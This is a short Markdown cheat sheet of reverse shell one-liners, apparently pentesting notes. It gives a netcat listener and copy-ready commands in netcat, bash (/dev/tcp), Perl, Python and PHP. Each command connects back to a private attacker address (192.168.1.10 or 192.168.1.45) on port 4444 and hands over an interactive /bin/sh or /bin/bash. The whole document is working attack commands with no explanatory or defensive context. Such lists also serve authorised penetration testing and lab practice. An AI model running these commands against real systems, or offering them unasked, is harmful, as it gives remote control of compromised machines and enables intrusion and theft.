
## Reverse Shells
---

Listen to all them with
```bash
# nc -lvp 4444
```
### Netcat
---
```bash
# nc -e /bin/sh 192.168.1.10 4444
# nc -e /bin/bash 192.168.1.10 4444
# nc -c bash 192.168.1.10 4444
```
If the victim `netcat` version does not support `-e`, try to use:
```bash
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.10 4444 >/tmp/f
```
### Bash
---
```bash
# 0<&196;exec 196<>/dev/tcp/192.168.1.10/4444; sh <&196 >&196 2>&196
```
```c
# bash -i >& /dev/tcp/192.168.1.10/4444 0>&1
```
### Perl
---
```perl
perl -e 'use Socket;$i="192.168.1.10";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
### Python
---
```python
# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.45",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```
### PHP
---
```php
# php -r '$sock=fsockopen("192.168.1.10",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```
```php
# php -r '$sock=fsockopen("192.168.1.10",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
# php -r '$sock=fsockopen("192.168.1.10",4444);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
# php -r '$sock=fsockopen("192.168.1.10",4444);`/bin/sh -i <&3 >&3 2>&3`;'
# php -r '$sock=fsockopen("192.168.1.10",4444);system("/bin/sh -i <&3 >&3 2>&3");'
# php -r '$sock=fsockopen("192.168.1.10",4444);passthru("/bin/sh -i <&3 >&3 2>&3");'
# php -r '$sock=fsockopen("192.168.1.10",4444);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
```

